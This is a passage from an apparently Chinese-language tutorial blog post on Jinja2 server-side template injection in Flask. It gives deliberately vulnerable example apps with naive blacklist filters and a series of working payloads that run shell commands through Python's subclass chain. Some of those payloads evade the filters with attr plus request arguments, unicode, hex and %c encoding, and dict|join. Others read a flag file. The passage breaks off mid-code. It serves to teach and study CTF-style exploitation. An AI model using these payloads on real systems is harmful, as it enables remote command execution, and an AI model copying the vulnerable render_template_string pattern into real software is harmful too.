将值转换为float类型</span></span><br><span class="line">lower()   <span class="comment"># 将字符串转换为小写</span></span><br><span class="line">upper()   <span class="comment"># 将字符串转换为大写</span></span><br><span class="line">reverse() <span class="comment"># 反转字符串</span></span><br><span class="line">replace(value,old,new) <span class="comment"># 将value中的old替换成new</span></span><br><span class="line"><span class="built_in">list</span>()    <span class="comment"># 将变量转换为列表类型</span></span><br><span class="line">string()  <span class="comment"># 将变量转换成字符串类型</span></span><br><span class="line">join()    <span class="comment"># 将一个序列中的参数值拼接成字符串，通常有python内置的dict()配合使用</span></span><br><span class="line">attr()    <span class="comment"># 获取对象的属性</span></span><br></pre></td></tr></table></figure><p>下面看一段代码来简单的使用一下这些过滤器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&quot;str&quot;</span>)</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            upper:&#123;&#123;str|upper&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            upper-lower:&#123;&#123;str|upper|lower&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            attr:&#123;&#123;()|attr(&#x27;__class__&#x27;)&#125;&#125;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str, <span class="built_in">str</span>=<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>过滤器的用法是直接在数据后面套<code>|</code>，然后拼接对应的过滤器，这段代码传入下面payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=ls</span><br></pre></td></tr></table></figure><p>返回值如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250701161118.png"><br>好，我们知道过滤的用法之后我们看一道例题，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (<span class="string">&quot;_&quot;</span> <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这道题目是不允许传输<code>_</code>这个字符，之前学的payload都是需要用过魔术方法(一般都会有<code>_</code>)进行做攻击的，这里肯定是没有办法，但是可以通过attr+request的方式进行绕过，原始payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">147</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>通过attr+request的方法绕过<code>_</code>过滤之后的payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(<span class="number">147</span>)|attr(request.args.e)|attr(request.args.f)|attr(request.args.g)(request.args.h)|attr(request.args.i)(<span class="string">&#x27;eval&#x27;</span>)(request.args.j)&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=__getitem__&amp;h=__builtins__&amp;i=__getitem__&amp;j=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250701162420.png"><br>然后除了过滤器之外还可以使用下面的几种方法和payload进行绕过<br>unicode编码也可以绕过，对应的payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="number">147</span>)|attr(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0064\u0069\u0072\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>16进制编码绕过也可以，对应的payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;</span>)()|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="number">147</span>)|attr(<span class="string">&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>base64也可以进行绕过，但是python3已经不可以使用了，这里就不演示了，遇到这种可以现搜。<br>格式化字符串的形式也可以绕过，通过格式化<code>_</code>来绕过，对应的payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;%c%cclass%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))|attr(<span class="string">&quot;%c%cbase%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))|attr(<span class="string">&quot;%c%csubclasses%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))()|attr(<span class="string">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))(<span class="number">147</span>)|attr(<span class="string">&quot;%c%cinit%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))|attr(<span class="string">&quot;%c%cglobals%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))|attr(<span class="string">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))(<span class="string">&quot;%c%cbuiltins%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))|attr(<span class="string">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;%c%cimport%c%c(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))&#125;&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是这里<code>%c</code>可能会被识别成url编码导致解析失败，最好url转一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=%7B%7B%<span class="number">27</span>%<span class="number">27</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cclass%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cbase%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25csubclasses%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cgetitem%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%<span class="number">28147</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cinit%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cglobals%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cgetitem%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">22</span>%25c%25cbuiltins%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cgetitem%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%<span class="number">28</span>%27<span class="built_in">eval</span>%<span class="number">27</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">22</span>%25c%25cimport%25c%25c%<span class="number">28</span>%27os%<span class="number">27</span>%<span class="number">29</span>%2Epopen%<span class="number">28</span>%27<span class="built_in">dir</span>%<span class="number">27</span>%<span class="number">29</span>%2Eread%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7D%7D</span><br></pre></td></tr></table></figure><p>PS:模板payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__base__&quot;</span>)|attr(<span class="string">&quot;__subclasses__&quot;</span>)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="number">147</span>)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="字符串过滤绕过"><a href="#字符串过滤绕过" class="headerlink" title="字符串过滤绕过"></a>字符串过滤绕过</h1><p>看一道例题，源码是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (</span><br><span class="line">        <span class="string">&quot;class&quot;</span> <span class="keyword">in</span> input_str <span class="keyword">or</span> <span class="string">&quot;base&quot;</span> <span class="keyword">in</span> input_str <span class="keyword">or</span> <span class="string">&quot;request&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>如果这道题目不过滤<code>request</code>就完全可以通过他去绕过，这里需要自己拼接字符串，在上面也简单的学习了一些过滤器，下面介绍一下<code>join</code>和<code>dict</code>的组合用法，我们先看一下join和dict的基础用法，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            a:&#123;% set a=dict(aaa=1,bbb=2)|join%&#125;&#123;&#123;a&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>此时访问返回的内容将是<code>aaabbb</code>，上端代码的主要内容是下面这串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a=dict(aaa=1,bbb=2)|join%&#125;&#123;&#123;a&#125;&#125;</span><br></pre></td></tr></table></figure><p>他是先设置了一个变量a，然后创建了一个dict(字典)类型，里面存储了两个数据，然后通过join去拼接dict的键，拼好的内容丢给a变量，最后展示出来。这里就可以通过这个特定进行绕过上面的例题，具体采用的payload模板是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__base__&quot;</span>)|attr(<span class="string">&quot;__subclasses__&quot;</span>)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="number">147</span>)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>通过下面的payload进行绕过(采用dict+join过滤器)，payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;% <span class="built_in">set</span> aaaa=<span class="built_in">dict</span>(__cla=<span class="number">1</span>,ss__=b)|join %&#125;&#123;%<span class="built_in">set</span> bbbb=<span class="built_in">dict</span>(__ba=<span class="number">1</span>,se__=<span class="number">2</span>)|join%&#125;&#123;%<span class="built_in">set</span> cccc=<span class="built_in">dict</span>(__subcl=<span class="number">1</span>,asses__=<span class="number">2</span>)|join%&#125;&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(aaaa)|attr(bbbb)|attr(cccc)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="number">147</span>)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702133606.png"></p><h1 id="点过滤绕过"><a href="#点过滤绕过" class="headerlink" title="点过滤绕过"></a>点过滤绕过</h1><p>这个其实没什么好说的，可以通过python的语法使用<code>[]</code>去绕过，或者使用attr都可以，例题代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>可以通过<code>[]</code>或者<code>attr</code>绕过，payload模板如下,使用的是<code>_frozen_importlib_external.FileLoader</code>类读取文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引][<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>成功绕过的payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">122</span>][<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;flag&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="built_in">str</span>=&#123;&#123; (<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">122</span>]|attr(<span class="string">&quot;get_data&quot;</span>)(<span class="number">0</span>,<span class="string">&quot;flag&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="数字过滤绕过"><a href="#数字过滤绕过" class="headerlink" title="数字过滤绕过"></a>数字过滤绕过</h1><p>例题如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 